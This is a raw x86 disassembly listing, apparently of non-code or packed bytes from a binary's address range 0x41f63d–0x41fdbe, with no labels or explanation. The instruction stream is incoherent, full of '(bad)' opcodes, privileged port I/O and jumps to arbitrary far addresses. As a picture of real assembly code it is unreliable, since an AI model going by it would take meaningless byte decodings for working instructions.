  41f63d:	add    esi,DWORD PTR ds:0xc96ee7e1
  41f643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f644:	pop    es
  41f645:	fsubr  QWORD PTR [esi+0x2f811f83]
  41f64b:	jne    0x41f68a
  41f64d:	cwde   
  41f64e:	mov    al,ds:0xac27a494
  41f653:	retf   
  41f654:	jl     0x41f5e2
  41f656:	cmc    
  41f657:	mov    edi,DWORD PTR [ecx-0x75]
  41f65a:	aaa    
  41f65b:	cwde   
  41f65c:	out    dx,al
  41f65d:	adc    eax,0x7e4ed6c8
  41f662:	add    ebx,DWORD PTR [edi]
  41f664:	cmp    al,0x25
  41f666:	or     al,ah
  41f668:	leave  
  41f669:	into   
  41f66a:	call   DWORD PTR [esi+eiz*2]
  41f66d:	sbb    DWORD PTR [edx+ebp*1-0x2ec627ec],eax
  41f674:	hlt    
  41f675:	(bad)  
  41f676:	dec    eax
  41f677:	retf   0x18ac
  41f67a:	push   eax
  41f67b:	shr    bh,0x47
  41f67e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f67f:	mov    esp,0x9e8e178b
  41f684:	(bad)  
  41f686:	arpl   WORD PTR [esi+esi*1-0x36a093e5],si
  41f68d:	or     DWORD PTR [edi-0x26],edi
  41f690:	push   edx
  41f691:	push   eax
  41f692:	neg    DWORD PTR [esi+0x15]
  41f695:	pop    ebx
  41f696:	in     eax,dx
  41f697:	loopne 0x41f6e3
  41f699:	cdq    
  41f69a:	enter  0xf0bd,0x25
  41f69e:	xor    eax,0x7af04e0e
  41f6a3:	sbb    DWORD PTR [ecx-0x22],ebx
  41f6a6:	cmp    al,0x1e
  41f6a8:	xor    esp,DWORD PTR [edi+0x6b]
  41f6ab:	gs cs jmp 0x45cdfeae
  41f6b2:	xchg   esi,eax
  41f6b3:	inc    edx
  41f6b4:	daa    
  41f6b5:	mov    eax,0x4bc19f98
  41f6ba:	cmp    dl,BYTE PTR [esi]
  41f6bc:	sbb    al,0xb4
  41f6be:	adc    ebp,edi
  41f6c0:	addr16 int 0xcc
  41f6c3:	sub    DWORD PTR [edx],ebp
  41f6c5:	hlt    
  41f6c6:	fwait
  41f6c7:	aas    
  41f6c8:	add    eax,0x8173d81f
  41f6cd:	and    WORD PTR ds:0x750f8d96,di
  41f6d4:	cs push ss
  41f6d6:	inc    ebp
  41f6d7:	xlat   BYTE PTR es:[ebx]
  41f6d9:	mov    al,0x65
  41f6db:	into   
  41f6dc:	inc    ecx
  41f6dd:	jae    0x41f6e0
  41f6df:	sbb    edx,DWORD PTR [eax+0x5c04966]
  41f6e5:	fldcw  WORD PTR [ebp-0x51]
  41f6e8:	shl    DWORD PTR [esp+ecx*8-0x4673495f],1
  41f6ef:	jle    0x41f6c7
  41f6f1:	cs popa 
  41f6f3:	dec    edx
  41f6f4:	in     al,dx
  41f6f5:	xchg   edx,eax
  41f6f6:	xor    BYTE PTR [edi+0x5d],ah
  41f6f9:	xor    eax,0xab227f3e
  41f6fe:	(bad)  
  41f700:	div    BYTE PTR [eax-0x6b753138]
  41f706:	(bad)  
  41f707:	nop
  41f708:	add    edi,ebp
  41f70a:	cs push cs
  41f70c:	popa   
  41f70d:	mov    ?,WORD PTR [esi+0x4f2255ef]
  41f713:	adc    DWORD PTR [esi],esp
  41f715:	repnz cmp DWORD PTR [ecx-0x36e53744],eax
  41f71c:	xchg   ebx,eax
  41f71d:	rol    DWORD PTR [edi],1
  41f71f:	or     BYTE PTR [esi-0x55],al
  41f722:	cdq    
  41f723:	addr16 hlt 
  41f725:	out    0xfe,al
  41f727:	dec    ebp
  41f728:	imul   ecx,DWORD PTR [esi],0x80a42ee9
  41f72e:	adc    BYTE PTR [esi+ebp*4-0xc],0x21
  41f733:	sub    ch,ch
  41f735:	sbb    ah,dh
  41f737:	out    dx,eax
  41f738:	test   al,0xab
  41f73a:	(bad)  
  41f73c:	retf   
  41f73d:	cdq    
  41f73e:	pop    eax
  41f73f:	mov    DWORD PTR [esi+eiz*1+0x43ddfd5],edx
  41f746:	out    dx,al
  41f747:	add    DWORD PTR [bp+di+0x12cc],ebx
  41f74c:	sbb    BYTE PTR [esp+ebx*2-0x17],al
  41f750:	test   BYTE PTR [ebp+0x6cf72f1d],ch
  41f756:	test   al,cl
  41f758:	push   esp
  41f759:	(bad)  
  41f75a:	out    dx,al
  41f75b:	lds    ecx,FWORD PTR [edi-0x28b27fce]
  41f761:	shl    DWORD PTR [ecx],0x90
  41f764:	out    0xa6,eax
  41f766:	loopne 0x41f779
  41f768:	sbb    al,0x14
  41f76a:	push   edx
  41f76b:	test   eax,0xa016cdee
  41f770:	sub    cl,BYTE PTR [eax-0xc579ec9]
  41f776:	or     al,0xff
  41f778:	fdiv   st,st(6)
  41f77a:	call   0x1f6f:0xc2c0a2ae
  41f781:	mov    al,cl
  41f783:	pop    ds
  41f784:	(bad)  [esp+edx*8-0x1f]
  41f788:	rcr    DWORD PTR [eax],0x79
  41f78b:	pop    ebx
  41f78c:	cld    
  41f78d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f78e:	loop   0x41f7dc
  41f790:	adc    DWORD PTR [edi+eax*4+0x4a9510d0],ecx
  41f797:	dec    ecx
  41f798:	pop    ebx
  41f799:	pop    ebx
  41f79a:	adc    edx,DWORD PTR [esi-0x5c0a21d]
  41f7a0:	test   al,0xe1
  41f7a2:	mov    edx,0x7e29522
  41f7a7:	or     ah,BYTE PTR [ecx]
  41f7a9:	jle    0x41f75d
  41f7ab:	xchg   esp,eax
  41f7ac:	inc    ecx
  41f7ad:	mov    al,0xf1
  41f7af:	outs   dx,DWORD PTR ds:[esi]
  41f7b0:	mov    dh,0x60
  41f7b2:	jae    0x41f7c2
  41f7b4:	jl     0x41f7f2
  41f7b6:	xchg   edx,eax
  41f7b7:	addr16 es push ecx
  41f7ba:	loope  0x41f7c7
  41f7bc:	and    edi,ebp
  41f7be:	xor    BYTE PTR [edi+0x74],0xcf
  41f7c2:	mov    edi,0x8c69d4e7
  41f7c7:	jp     0x41f759
  41f7c9:	xchg   edx,eax
  41f7ca:	pop    esi
  41f7cb:	fwait
  41f7cc:	(bad)  
  41f7cd:	push   eax
  41f7ce:	je     0x41f753
  41f7d0:	xor    DWORD PTR [eax+ebx*8],ebp
  41f7d3:	sbb    bh,ah
  41f7d5:	xor    cl,dl
  41f7d7:	pop    eax
  41f7d8:	jnp    0x41f760
  41f7da:	sbb    al,BYTE PTR [eax]
  41f7dc:	imul   esp,DWORD PTR [edx-0x7f7bf548],0x34
  41f7e3:	push   cs
  41f7e4:	xchg   ecx,eax
  41f7e5:	call   0xcc11bc4a
  41f7ea:	or     bh,BYTE PTR [edi+0x1e5afdbc]
  41f7f0:	aas    
  41f7f1:	mov    esp,0x672afb57
  41f7f6:	(bad)  
  41f7f7:	mov    ecx,0xd646ebe7
  41f7fc:	mov    ds:0x2aee3c9f,eax
  41f801:	xor    al,0x3f
  41f803:	jns    0x41f84d
  41f805:	scas   al,BYTE PTR es:[edi]
  41f806:	dec    edx
  41f807:	pop    eax
  41f808:	adc    al,0x58
  41f80a:	nop
  41f80b:	rol    esp,0x9b
  41f80e:	pop    ebx
  41f80f:	rcl    cl,0x7f
  41f812:	cmp    cl,BYTE PTR [ecx+0x15]
  41f815:	jp     0x41f83e
  41f817:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41f819:	dec    eax
  41f81a:	outs   dx,BYTE PTR ds:[esi]
  41f81b:	jmp    0x41f838
  41f81d:	mov    edx,0x221b021e
  41f822:	and    DWORD PTR [edi],ebp
  41f824:	icebp  
  41f825:	mov    dh,0x70
  41f827:	push   ebx
  41f828:	adc    eax,0x519f9337
  41f82d:	sar    dl,0x4e
  41f830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f831:	lods   al,BYTE PTR ds:[esi]
  41f832:	xor    al,bl
  41f834:	daa    
  41f835:	pop    ebx
  41f836:	mov    dl,0x8f
  41f838:	inc    edi
  41f839:	pop    ds
  41f83a:	ins    DWORD PTR es:[edi],dx
  41f83b:	and    cl,bl
  41f83d:	sub    ebp,edi
  41f83f:	jns    0x41f868
  41f841:	test   DWORD PTR [ebp+0x75],ecx
  41f844:	repnz xor ebx,DWORD PTR [edi+0x7f39dfc8]
  41f84b:	shl    BYTE PTR [ecx],0x29
  41f84e:	jge    0x41f7ed
  41f850:	or     DWORD PTR [esi],eax
  41f852:	test   eax,0x10bcc80
  41f857:	mov    ebp,0xd9f743df
  41f85c:	sar    BYTE PTR [eax],0x80
  41f85f:	(bad)  
  41f861:	cmp    BYTE PTR [edi],cl
  41f863:	or     eax,0x9b5c3f5f
  41f868:	inc    esi
  41f869:	add    al,0x85
  41f86b:	aam    0x1a
  41f86d:	add    eax,0xa03f8826
  41f872:	xchg   esp,eax
  41f873:	in     al,0x76
  41f875:	pop    ebx
  41f876:	dec    ecx
  41f877:	mov    eax,0x86fa957c
  41f87c:	xor    ebx,DWORD PTR [ebx-0x2ca5d006]
  41f882:	inc    eax
  41f883:	jbe    0x41f8f0
  41f885:	mov    ds:0xb2ad0be1,eax
  41f88a:	xchg   BYTE PTR [edx+0x29],al
  41f88d:	imul   esp,DWORD PTR [ecx+0x5c430731],0x20
  41f894:	push   0xaa31d01b
  41f899:	sbb    ah,dh
  41f89b:	in     al,0xee
  41f89d:	outs   dx,BYTE PTR ds:[esi]
  41f89e:	dec    edi
  41f89f:	pop    edx
  41f8a0:	retf   
  41f8a1:	ja     0x41f90b
  41f8a3:	mov    DWORD PTR [eax+0x698f125],ecx
  41f8a9:	dec    ebp
  41f8aa:	(bad)  
  41f8ab:	mov    ebp,0x4289b493
  41f8b0:	cmc    
  41f8b1:	xlat   BYTE PTR ds:[ebx]
  41f8b2:	ret    0xf518
  41f8b5:	outs   dx,DWORD PTR ds:[esi]
  41f8b6:	mov    esi,0x1256abc0
  41f8bb:	or     al,dh
  41f8bd:	bound  esp,QWORD PTR [eax-0x69354a1f]
  41f8c3:	fisubr DWORD PTR [eax-0x58c91b55]
  41f8c9:	out    dx,eax
  41f8ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8cb:	dec    ebx
  41f8cc:	enter  0x6ace,0xa5
  41f8d0:	clc    
  41f8d1:	pushf  
  41f8d2:	add    eax,0x590c7a7e
  41f8d7:	mov    bl,0x1
  41f8d9:	nop
  41f8da:	cld    
  41f8db:	mov    dl,0xfe
  41f8dd:	imul   ebp,DWORD PTR [ecx+ebp*4-0x55],0x631329fa
  41f8e5:	fbld   TBYTE PTR [eax-0x649c3719]
  41f8eb:	xchg   ecx,eax
  41f8ec:	pop    edi
  41f8ed:	fmul   QWORD PTR [edx]
  41f8ef:	pop    edx
  41f8f0:	jecxz  0x41f95c
  41f8f2:	push   ds
  41f8f3:	mov    ds,WORD PTR [ebp+0x2bfa9fbd]
  41f8f9:	or     ebx,DWORD PTR [ecx+0x41]
  41f8fc:	sub    al,0xd
  41f8fe:	cmp    ebx,DWORD PTR [esi]
  41f900:	lahf   
  41f901:	cmp    ah,BYTE PTR [edi-0x6d]
  41f904:	loop   0x41f935
  41f906:	fxch   st(5)
  41f908:	cmp    eax,0x538b0550
  41f90d:	mov    BYTE PTR [ebx+0x795313db],ch
  41f913:	jp     0x41f983
  41f915:	jmp    0x8a28fd99
  41f91a:	fs hlt 
  41f91c:	aad    0xc6
  41f91e:	(bad)  [edx]
  41f920:	mov    edi,0xacef1b2f
  41f925:	and    BYTE PTR [ebp+0x64f0d7de],0xef
  41f92c:	cld    
  41f92d:	jb     0x41f8c7
  41f92f:	outs   dx,DWORD PTR ds:[esi]
  41f930:	(bad)  
  41f931:	push   edi
  41f932:	jg     0x41f97b
  41f934:	adc    edx,DWORD PTR [eax-0x2f]
  41f937:	add    DWORD PTR [ebp+ebp*8-0x49d12771],ecx
  41f93e:	xchg   esp,eax
  41f93f:	(bad)  
  41f940:	hlt    
  41f941:	xor    al,0x52
  41f943:	adc    DWORD PTR [edi],0x52
  41f946:	aam    0x8f
  41f948:	test   BYTE PTR [ebp+eiz*4+0xa],bl
  41f94c:	and    BYTE PTR [edi],bh
  41f94e:	cmc    
  41f94f:	mov    ah,0xd2
  41f951:	fistp  WORD PTR [edx]
  41f953:	mov    esi,DWORD PTR [edx]
  41f955:	mov    dh,dh
  41f957:	arpl   WORD PTR [edx+ecx*2],bx
  41f95a:	cs push edx
  41f95c:	aas    
  41f95d:	aad    0x14
  41f95f:	xor    eax,DWORD PTR [edx-0x43]
  41f962:	pop    esp
  41f963:	jmp    0xdece:0xaddfc232
  41f96a:	jle    0x41f9c6
  41f96c:	je     0x41f94a
  41f96e:	call   edx
  41f970:	shl    DWORD PTR [ecx-0x61df6858],1
  41f976:	ja     0x41f98c
  41f978:	jmp    0xd772defd
  41f97d:	add    eax,0xf3df89a3
  41f982:	xchg   DWORD PTR [ebx+0x2c],ebp
  41f985:	pop    edx
  41f986:	jo     0x41f9dd
  41f988:	mov    ecx,0x76c8a803
  41f98d:	and    esi,edx
  41f98f:	dec    esi
  41f990:	test   eax,0x69a077b9
  41f995:	inc    ecx
  41f996:	lds    esp,FWORD PTR [eax]
  41f998:	adc    ebp,DWORD PTR [edx+0x32]
  41f99b:	shl    BYTE PTR [edx-0x34e3e8d1],1
  41f9a1:	xchg   esp,eax
  41f9a2:	jno    0x41fa10
  41f9a4:	mov    al,0xe7
  41f9a6:	addr16 jns 0x41fa10
  41f9a9:	pop    esp
  41f9aa:	(bad)  
  41f9ab:	sub    BYTE PTR [edx+edi*4+0x5fb95d91],bl
  41f9b2:	out    0x9,eax
  41f9b4:	push   0x78
  41f9b6:	push   ebx
  41f9b7:	jge    0x41f9ea
  41f9b9:	inc    edi
  41f9ba:	sbb    eax,0xedd2b51f
  41f9bf:	and    BYTE PTR [ebx-0x8],dl
  41f9c2:	retf   
  41f9c3:	cmp    bh,ch
  41f9c5:	and    edx,DWORD PTR [ecx+0x4f]
  41f9c8:	jp     0x41f9ca
  41f9ca:	jle    0x41f9ac
  41f9cc:	sbb    eax,0x4633f87b
  41f9d1:	inc    dl
  41f9d3:	loope  0x41f9eb
  41f9d5:	pop    edi
  41f9d6:	dec    edi
  41f9d7:	add    BYTE PTR [eax+edx*2],al
  41f9da:	jge    0x41fa20
  41f9dc:	xor    DWORD PTR ss:[edx+0x3ae559a5],edx
  41f9e3:	cdq    
  41f9e4:	int    0x5c
  41f9e6:	stc    
  41f9e7:	mov    cl,0x23
  41f9e9:	or     esp,DWORD PTR ds:0x3b1abc31
  41f9ef:	(bad)  
  41f9f0:	pop    esp
  41f9f1:	mov    ecx,0x6f3395e2
  41f9f6:	arpl   cx,cx
  41f9f8:	xor    BYTE PTR [edi+0x7cf2215d],bl
  41f9fe:	daa    
  41f9ff:	int    0x16
  41fa01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa02:	xchg   edx,eax
  41fa03:	call   0xb8f2:0x274673d1
  41fa0a:	loopne 0x41fa39
  41fa0c:	cli    
  41fa0d:	pop    ecx
  41fa0e:	int3   
  41fa0f:	ret    
  41fa10:	dec    eax
  41fa11:	ficomp WORD PTR [ebp-0x6b]
  41fa14:	add    eax,0xc6d48f05
  41fa19:	es mov edx,0x7dd8c38d
  41fa1f:	pop    ss
  41fa20:	test   DWORD PTR [edx],ebp
  41fa22:	(bad)  
  41fa23:	in     al,0x1d
  41fa25:	jo     0x41f9d0
  41fa27:	mov    ch,cl
  41fa29:	fist   WORD PTR [ecx-0x1d]
  41fa2c:	push   0xab58d291
  41fa31:	aam    0x3f
  41fa33:	and    DWORD PTR [edi-0x33ff2d3c],ecx
  41fa39:	or     DWORD PTR [eax-0x51],edi
  41fa3c:	adc    esi,esi
  41fa3e:	mov    BYTE PTR [eax],ah
  41fa40:	adc    eax,0xe23a8aa2
  41fa45:	in     eax,dx
  41fa46:	inc    esi
  41fa47:	jns    0x41fa31
  41fa49:	add    eax,0x850cfbeb
  41fa4e:	aaa    
  41fa4f:	scas   al,BYTE PTR es:[edi]
  41fa50:	sti    
  41fa51:	add    ebx,DWORD PTR [eax-0x24]
  41fa54:	mov    ds:0xd8a20196,eax
  41fa59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa5a:	shr    DWORD PTR [edx],0xb9
  41fa5d:	inc    ebx
  41fa5e:	(bad)  
  41fa5f:	repz xchg edi,eax
  41fa61:	dec    edi
  41fa62:	sbb    BYTE PTR [eax+0x35],0x6f
  41fa66:	pop    edi
  41fa67:	or     al,dh
  41fa69:	call   0x4151:0x60954248
  41fa70:	inc    edx
  41fa71:	dec    esp
  41fa72:	adc    ecx,ebx
  41fa74:	xchg   edx,eax
  41fa75:	push   ebp
  41fa76:	push   0x5e
  41fa78:	mov    edi,0x10a2ac04
  41fa7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa7e:	push   ebx
  41fa7f:	mov    BYTE PTR [edx+0x7a],ah
  41fa82:	mov    DWORD PTR ds:0x68dad86e,ecx
  41fa88:	add    DWORD PTR [eax-0xfb3ecc4],ebp
  41fa8e:	sbb    BYTE PTR [edi],al
  41fa90:	cld    
  41fa91:	iret   
  41fa92:	and    bh,bl
  41fa94:	loopne 0x41fa1b
  41fa96:	es or  ah,al
  41fa99:	xor    DWORD PTR [eax],esi
  41fa9b:	mov    edi,0xd4e6d3
  41faa0:	add    edx,DWORD PTR [esi+ebx*2-0x461ec6f9]
  41faa7:	fld    DWORD PTR [edx+0x632497cf]
  41faad:	mov    ds:0xa265b509,al
  41fab2:	add    bl,BYTE PTR [ebp+0x7]
  41fab5:	ins    DWORD PTR es:[edi],dx
  41fab6:	mov    ?,WORD PTR [esi-0x3befb633]
  41fabc:	xor    DWORD PTR [ebp+0x7],ebp
  41fabf:	(bad)  
  41fac1:	push   ss
  41fac2:	subps  xmm6,XMMWORD PTR [edx-0x114775d8]
  41fac9:	loopne 0x41fa68
  41facb:	mov    dl,0x5f
  41facd:	jle    0x41fab6
  41facf:	retf   
  41fad0:	mov    BYTE PTR [ebx+0x6b],bl
  41fad3:	fnstsw ax
  41fad5:	xlat   BYTE PTR ds:[ebx]
  41fad6:	jmp    0xb88f:0x1ec892b6
  41fadd:	idiv   DWORD PTR [edx-0xf8b6fbd]
  41fae3:	xor    DWORD PTR [edx],ecx
  41fae5:	fdivr  DWORD PTR [ecx-0x4c6c4052]
  41faeb:	or     dl,BYTE PTR [esi+0x59c5fb01]
  41faf1:	xchg   esi,eax
  41faf2:	mov    esp,0xc3687edf
  41faf7:	jecxz  0x41fb3b
  41faf9:	imul   edx,DWORD PTR [edi-0x69],0x8307908
  41fb00:	jge    0x41fb04
  41fb02:	sub    al,0xea
  41fb04:	icebp  
  41fb05:	or     al,0xa8
  41fb07:	scas   eax,DWORD PTR es:[edi]
  41fb08:	xchg   DWORD PTR [eax+0x67b080ca],edx
  41fb0e:	or     DWORD PTR [eax+0x6d93ecf],esi
  41fb14:	cld    
  41fb15:	xchg   ebp,eax
  41fb16:	jo     0x41fad4
  41fb18:	inc    ebx
  41fb19:	mov    ah,0x24
  41fb1b:	dec    edi
  41fb1c:	adc    DWORD PTR [ebp+0x6d607ad2],esi
  41fb22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb23:	sbb    ah,BYTE PTR [eax-0x4d6119f0]
  41fb29:	int3   
  41fb2a:	fmul   QWORD PTR [ecx+0x3c949411]
  41fb30:	or     bh,BYTE PTR [esi]
  41fb32:	retf   0x51a5
  41fb35:	xor    eax,0x82461934
  41fb3a:	mov    ds:0xe1d27983,eax
  41fb3f:	aam    0x71
  41fb41:	loope  0x41fb46
  41fb43:	aam    0x3
  41fb45:	push   edi
  41fb46:	inc    esi
  41fb47:	dec    ebx
  41fb48:	mov    cl,0x8c
  41fb4a:	add    dh,dh
  41fb4c:	fsubp  st(1),st
  41fb4e:	mov    esi,0xb3b60343
  41fb53:	mov    ?,ecx
  41fb55:	sub    al,0x1a
  41fb57:	push   ss
  41fb58:	add    DWORD PTR [ebx+ebx*8],ebp
  41fb5b:	rol    BYTE PTR [edx+0xfa55110],cl
  41fb61:	shr    DWORD PTR [eax-0x69],0xba
  41fb65:	cmp    esp,eax
  41fb67:	add    ebx,DWORD PTR [ecx-0x13241660]
  41fb6d:	dec    edx
  41fb6e:	or     DWORD PTR [edx+0x6246cba3],0xffffffa6
  41fb75:	push   ss
  41fb76:	(bad)  
  41fb77:	mov    ecx,edx
  41fb79:	xchg   esp,eax
  41fb7a:	ins    DWORD PTR es:[edi],dx
  41fb7b:	or     dh,dh
  41fb7d:	fisub  WORD PTR [edi+0x5f]
  41fb80:	push   edi
  41fb81:	pop    edi
  41fb82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb83:	test   DWORD PTR [eax],edi
  41fb85:	call   0x38d1eb6a
  41fb8a:	aad    0x14
  41fb8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb8d:	test   eax,0xc788dec7
  41fb92:	adc    eax,0x25f119d8
  41fb97:	cmp    DWORD PTR [edi-0x6b],ebp
  41fb9a:	xor    al,0x2f
  41fb9c:	stos   DWORD PTR es:[edi],eax
  41fb9d:	in     al,dx
  41fb9e:	push   0x76eb6844
  41fba3:	rcr    BYTE PTR [eax-0x641e4f19],cl
  41fba9:	dec    ecx
  41fbaa:	fwait
  41fbab:	test   eax,0xd6aad1ac
  41fbb0:	icebp  
  41fbb1:	mov    ds:0xc44e6cd8,eax
  41fbb6:	les    esi,FWORD PTR [ecx-0x26458fcb]
  41fbbc:	mov    bl,0x3f
  41fbbe:	jo     0x41fba6
  41fbc0:	sub    DWORD PTR [eax-0xb],0xffffffad
  41fbc4:	retf   0x16c9
  41fbc7:	dec    esi
  41fbc8:	sub    BYTE PTR [esi],0x7
  41fbcb:	in     eax,0xc9
  41fbcd:	xchg   edx,eax
  41fbce:	scas   al,BYTE PTR es:[edi]
  41fbcf:	push   ds
  41fbd0:	push   0xdef56131
  41fbd5:	sti    
  41fbd6:	xor    BYTE PTR [esi+0x33f0df18],ch
  41fbdc:	mov    ds:0x8293cc0d,al
  41fbe1:	mov    ?,WORD PTR [eax-0x6f]
  41fbe4:	mov    bh,0xce
  41fbe6:	and    BYTE PTR [ebp+0x6a628d9c],0x15
  41fbed:	adc    esi,DWORD PTR [ebx-0x76600ab2]
  41fbf3:	xchg   esi,eax
  41fbf4:	xchg   esi,eax
  41fbf5:	stc    
  41fbf6:	xchg   esi,eax
  41fbf7:	lock test al,0x2e
  41fbfa:	out    dx,al
  41fbfb:	es leave 
  41fbfd:	sbb    cl,BYTE PTR [ecx]
  41fbff:	ja     0x41fc2d
  41fc01:	push   edx
  41fc02:	mov    bl,0x6b
  41fc04:	inc    ebp
  41fc05:	icebp  
  41fc06:	adc    eax,0x7dc609c8
  41fc0b:	lock adc ebp,DWORD PTR [ebp-0x1474c0de]
  41fc12:	js     0x41fbad
  41fc14:	mov    ah,0x12
  41fc16:	or     al,0xf1
  41fc18:	dec    ebx
  41fc19:	jmp    0x41fc47
  41fc1b:	push   esi
  41fc1c:	push   edi
  41fc1d:	inc    edx
  41fc1e:	mov    ebx,0x19b7d2ca
  41fc23:	push   ds
  41fc24:	jns    0x41fc39
  41fc26:	shl    ebx,1
  41fc28:	or     eax,0x64e0855
  41fc2d:	pop    ecx
  41fc2e:	cmp    BYTE PTR [eax-0x31a43cb1],0xca
  41fc35:	cmp    BYTE PTR [esi],ah
  41fc37:	or     DWORD PTR [ecx-0x739370a7],edi
  41fc3d:	aas    
  41fc3e:	jns    0x41fbd2
  41fc40:	and    DWORD PTR [ebp+eax*2-0x4b],esp
  41fc44:	mov    ss,WORD PTR [edx+ebp*4-0x28]
  41fc48:	dec    ebp
  41fc49:	mov    dl,0x29
  41fc4b:	lock ret 
  41fc4d:	dec    ecx
  41fc4e:	mov    eax,ds:0xb3b39a53
  41fc53:	hlt    
  41fc54:	sbb    esp,edx
  41fc56:	pop    ss
  41fc57:	mov    DWORD PTR [edx-0x7645e964],esp
  41fc5d:	jmp    0xc669:0x778ad394
  41fc64:	js     0x41fcdb
  41fc66:	jo     0x41fc12
  41fc68:	sub    DWORD PTR [esi],esp
  41fc6a:	jmp    0x688a:0xa3f84b06
  41fc71:	cwde   
  41fc72:	out    dx,al
  41fc73:	sbb    eax,0x6c6b80eb
  41fc78:	adc    eax,0x9108cfbb
  41fc7d:	push   DWORD PTR [ecx+0x2d33b7f6]
  41fc83:	mov    ch,bh
  41fc85:	dec    ebx
  41fc86:	jbe    0x41fcdd
  41fc88:	sub    DWORD PTR [edi-0x2c],edi
  41fc8b:	inc    edi
  41fc8c:	mov    BYTE PTR [edi+0x5fe3c11c],dl
  41fc92:	ja     0x41fcd0
  41fc94:	outs   dx,DWORD PTR ds:[esi]
  41fc95:	sbb    BYTE PTR [ecx+0x17b894a9],cl
  41fc9b:	loop   0x41fcdf
  41fc9d:	or     DWORD PTR [ebx],eax
  41fc9f:	mov    eax,0xc38ead9d
  41fca4:	scas   al,BYTE PTR es:[edi]
  41fca5:	and    dh,al
  41fca7:	sub    BYTE PTR [ebp-0x1436489d],ch
  41fcad:	or     BYTE PTR [ecx-0x4a],cl
  41fcb0:	cli    
  41fcb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcb2:	push   ebp
  41fcb3:	jns    0x41fcd6
  41fcb5:	or     ah,ah
  41fcb7:	dec    esi
  41fcb8:	mov    ebx,0xe9495b41
  41fcbd:	add    DWORD PTR [ecx-0x60],esi
  41fcc0:	xor    eax,0x9964b912
  41fcc6:	sub    eax,0x6deb816e
  41fccb:	bound  edi,QWORD PTR [edi+0x0]
  41fcce:	lds    eax,FWORD PTR [ebx-0x70]
  41fcd1:	nop
  41fcd2:	jg     0x41fc5d
  41fcd4:	dec    ecx
  41fcd5:	ins    BYTE PTR es:[edi],dx
  41fcd6:	pop    ebx
  41fcd7:	add    BYTE PTR [esi+0x3],ah
  41fcda:	sub    al,0xf0
  41fcdc:	jp     0x41fc85
  41fcde:	mov    ch,0x9f
  41fce0:	jge    0x41fcf6
  41fce2:	imul   eax,DWORD PTR [edx+ebp*2-0x5439fce8],0x4b87e85f
  41fced:	mov    cl,0x4e
  41fcef:	mul    DWORD PTR [edi-0x7ec3248c]
  41fcf5:	ss ins BYTE PTR es:[edi],dx
  41fcf7:	dec    ecx
  41fcf8:	mov    DWORD PTR [edi],ebx
  41fcfa:	mov    edx,0x966ec47
  41fcff:	jns    0x41fce1
  41fd01:	adc    eax,0x88736b96
  41fd06:	fdivrp st(3),st
  41fd08:	push   ebp
  41fd09:	jmp    0x41fd6d
  41fd0b:	or     DWORD PTR [ecx+0x50],esp
  41fd0e:	xor    ch,BYTE PTR [ecx]
  41fd10:	mov    bh,0xbd
  41fd12:	sbb    BYTE PTR [edi],ch
  41fd14:	mov    dl,0xeb
  41fd16:	(bad)  
  41fd18:	jg     0x41fd62
  41fd1a:	sbb    DWORD PTR [ebp+ebp*4+0x64],ebp
  41fd1e:	lock inc ecx
  41fd21:	jmp    0x7bd:0x4b5c5f54
  41fd28:	sbb    BYTE PTR [edi+0x2e080261],0x37
  41fd2f:	push   ss
  41fd30:	retf   
  41fd31:	cmp    al,0x87
  41fd33:	sub    BYTE PTR [ebx],0x84
  41fd36:	adc    eax,DWORD PTR [ecx+0x41]
  41fd39:	test   al,0x1a
  41fd3b:	pop    ss
  41fd3c:	and    edx,ebx
  41fd3e:	into   
  41fd3f:	pop    ebp
  41fd40:	inc    DWORD PTR [ecx-0x1d]
  41fd43:	idiv   BYTE PTR [ecx-0x69]
  41fd46:	push   es
  41fd47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd48:	gs pushf 
  41fd4a:	sbb    al,0x77
  41fd4c:	cld    
  41fd4d:	sahf   
  41fd4e:	inc    esp
  41fd4f:	call   0xff11:0x6a42df7c
  41fd56:	cld    
  41fd57:	add    BYTE PTR [eax+esi*8],0xa3
  41fd5b:	imul   eax,DWORD PTR [edx],0x6c
  41fd5e:	inc    edx
  41fd5f:	fcomp  QWORD PTR [esi+0x14]
  41fd62:	sar    DWORD PTR [edi-0x6d],1
  41fd65:	in     eax,dx
  41fd66:	xor    ecx,DWORD PTR [eax+0x3b]
  41fd69:	jmp    0x6d946f3a
  41fd6e:	push   0x6
  41fd70:	in     al,dx
  41fd71:	int    0x16
  41fd73:	loope  0x41fd0f
  41fd75:	popf   
  41fd76:	xlat   BYTE PTR ds:[ebx]
  41fd77:	mov    ebp,0x63f23e87
  41fd7c:	push   ecx
  41fd7d:	jmp    FWORD PTR [edi]
  41fd7f:	and    ecx,ebx
  41fd81:	adc    eax,0x817ff843
  41fd86:	leave  
  41fd87:	pop    ecx
  41fd88:	cmp    esi,DWORD PTR ds:0x53050654
  41fd8e:	mov    ebp,0xeb73d4b6
  41fd93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd94:	add    DWORD PTR [edx],edx
  41fd96:	mov    dh,0x8e
  41fd98:	(bad)  
  41fd99:	jbe    0x41fd44
  41fd9b:	jbe    0x41fd6e
  41fd9d:	mov    ebx,eax
  41fd9f:	add    DWORD PTR [edx],0xffffffea
  41fda2:	mov    bl,0x67
  41fda4:	adc    ebp,ebp
  41fda6:	jb     0x41fd52
  41fda8:	cvtpi2ps xmm2,QWORD PTR [edi-0x48]
  41fdac:	data16 int3 
  41fdae:	jg     0x41fd52
  41fdb0:	out    0x35,eax
  41fdb2:	xchg   ebx,eax
  41fdb3:	mov    al,ds:0xafe49241
  41fdb8:	or     edi,0x6b
  41fdbb:	mov    BYTE PTR [esi+0x16],ah
  41fdbe:	mov    dl,BYTE PTR [esi+esi*4]
